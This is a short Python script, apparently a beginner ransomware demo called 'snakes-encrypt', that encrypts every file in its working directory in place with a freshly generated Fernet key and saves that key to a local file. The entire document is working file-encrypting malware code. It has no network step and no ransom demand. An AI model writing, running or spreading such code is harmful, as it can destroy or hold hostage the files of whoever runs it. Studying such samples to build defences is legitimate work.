#!/usr/bin/evn python3

import os
from cryptography.fernet import Fernet
files =[]

for file in os.listdir():
    if file == "snakes-encrypt.py" or file == "snakes-key.key":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

key =Fernet.generate_key()

with open("snakes-key.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents =thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
